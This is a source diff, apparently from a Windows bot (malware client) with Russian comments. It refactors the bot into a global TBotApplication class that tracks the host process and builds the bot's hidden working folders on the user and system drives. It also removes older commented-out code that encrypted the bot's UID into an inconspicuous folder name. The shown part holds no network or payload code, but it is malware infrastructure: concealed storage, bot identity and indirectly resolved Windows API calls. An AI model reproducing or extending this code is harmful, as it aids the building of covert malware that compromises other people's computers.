@@ -9,8 +9,7 @@
 
 //---------------------------------------------------------------------------
 
-//const WORK_PATH[] = {'S', 'E', 'T', '_', 'R', 'N', 'D', '_', 'P', 'A', 'T', 'H', '-', '9',  0};
-
+TBotApplication* Bot;
 
 //---------------------------------------------------------------------------
 #define MAX_BOT_WORK_FOLDER_LEN 15
@@ -38,8 +37,71 @@ DWORD BotExeNameHash = 0;
 char BOT_UID[128];
 
 
+//****************************************************************************
+//                              TBotApplication
+//****************************************************************************
 
-PCHAR BotGetWorkFolder()
+TBotApplication::TBotApplication()
+{
+	// Инициализируем глобальные настройки бота
+	FTerminated = false;
+
+	// Определяем PID процесса
+	FPID = GetUniquePID();
+
+	// Определяем имя процесса в котором работает бот
+	pGetModuleFileNameA(NULL, FApplicationName.t_str(), MAX_PATH);
+	FApplicationName.CalcLength();
+}
+//-------------------------------------------------------------
+
+
+TBotApplication::~TBotApplication()
+{
+
+}
+//-------------------------------------------------------------
+
+DWORD TBotApplication::PID()
+{
+	// Функция возвращает идентификатор процесса в котором работает бот
+	return FPID;
+}
+//-------------------------------------------------------------
+
+bool TBotApplication::Terminated()
+{
+	// функция возвращает истину, если была получена команда
+	// на прекращение работы
+    return FTerminated;
+}
+
+//-------------------------------------------------------------
+
+string TBotApplication::ApplicationName()
+{
+	// Имя приложения в котором работает бот
+	return FApplicationName;
+}
+//-------------------------------------------------------------
+
+
+string TBotApplication::WorkPath()
+{
+	// Путь к рабочему каталогу бота, привязан  к текущему пользователю
+	return FWorkPath;
+}
+//-------------------------------------------------------------
+
+string TBotApplication::WorkSystemPath()
+{
+	// Путь к рабочему каталогу на системном диске, не привязан к пользователю
+	return FWorkSystemPath;
+}
+//-------------------------------------------------------------
+
+
+PCHAR TBotApplication::GetWorkFolder()
 {
 	// Функция возвращает рабочий каталог бота (короткое имя)
 
@@ -61,49 +123,40 @@ PCHAR BotGetWorkFolder()
 
 	STR::Free(Name);
 
-
-	// Получаем уид и шифруем его
-/*	PCHAR UID = GenerateBotID();
-
-    PCHAR Password = GetMainPassword(true);
-
-    const static char IV[] = {'d', 'j', 't', 'm', 'f', 'p', 'H', 'k',  0};
-
-	DWORD BufSize = StrCalcLength(UID);
-	LPBYTE Encrypted = RC2Crypt::WinEncode((LPBYTE)UID, BufSize, Password, (PCHAR)IV);
-	PCHAR B64 = BASE64::Encode(Encrypted, BufSize);
-
-	// Исправляем некоторые символе в результате
-	for (PCHAR S = B64; *S != 0; S++)
-    {
-		if (*S == '/')
-			*S = 'z';  // недопустимый символ
-		else
-		if (*S == '+')
-			*S = 'v';  // Редко встречается в названиях, не мозолим глаза :))
-	}
-
-	// Копируем строку
-	DWORD MCopy = MAX_BOT_WORK_FOLDER_LEN;
-	if (MCopy > STR::Length(B64))
-		MCopy = STR::Length(B64);
-
-	STR::Copy(B64, BOT_WORK_FOLDER_NAME, 0, MCopy);
-
-	// Уничтожаем промежуточные данные
-	STR::Free(Password);
-	STR::Free(UID);
-	MemFree(Encrypted);
-	STR::Free(B64);
-
-	*/
-
 	// Расчитываем хэш
 	BotWorkPathHash = CalcHash(BOT_WORK_FOLDER_NAME);
 
 	return BOT_WORK_FOLDER_NAME;
 }
 //----------------------------------------------------------------------------
+
+
+string TBotApplication::MakeWorkPath(bool SystemPath)
+{
+	// Функция генерирует рабочий путь
+	string Result;
+
+	TMemory Path(MAX_PATH);
+	if (!pSHGetSpecialFolderPathA(NULL, Path.Buf(), CSIDL_APPDATA, TRUE))
+		return Result;
+
+	if (SystemPath)
+	{
+		// Получаем путь в системной папке
+		PCHAR Tmp = STRA::Scan(Path.AsStr(), ':');
+		if (Tmp == NULL) return Result;
+		Tmp++;
+		*Tmp = 0;
+	}
+
+	Result = Path.AsStr();
+	Result += "\\";
+	Result += GetWorkFolder();
+	Result += "\\";
+
+	return Result;
+}
+
 
 PCHAR BOTDoGetWorkPath(bool InSysPath, PCHAR SubDir, PCHAR FileName)
 {
@@ -126,7 +179,7 @@ PCHAR BOTDoGetWorkPath(bool InSysPath, PCHAR SubDir, PCHAR FileName)
 	}
 
 
-	PCHAR WorkPath = BotGetWorkFolder(); // резервируем на будущее
+	PCHAR WorkPath = Bot->GetWorkFolder(); // резервируем на будущее
 
 	// Добавляем основной путь
 	StrConcat(Path, "\\");
@@ -148,6 +201,7 @@ PCHAR BOTDoGetWorkPath(bool InSysPath, PCHAR SubDir, PCHAR FileName)
 
 		if (!DirExists(Path))
 			pCreateDirectoryA(Path, NULL);
+
     }
 
 	PCHAR Result = STR::New(2, Path, FileName);
@@ -163,6 +217,9 @@ void BOT::Initialize()
 
 	// Инициализируем апи
 	InitializeAPI();
+
+	//Создаём глобальный объект бота
+    Bot = new TBotApplication();
 
 	// Создаём имя рабочей папки
 	GetWorkFolderHash();
@@ -198,7 +255,7 @@ PCHAR BOT::GetWorkPathInSysDrive(PCHAR SubDir, PCHAR FileName)
 DWORD BOT::GetWorkFolderHash()
 {
 	//  Функция возвращает хэш имени рабочей папки
-	BotGetWorkFolder();
+	Bot->GetWorkFolder();
 	return BotWorkPathHash;
 }
 //----------------------------------------------------------------------------
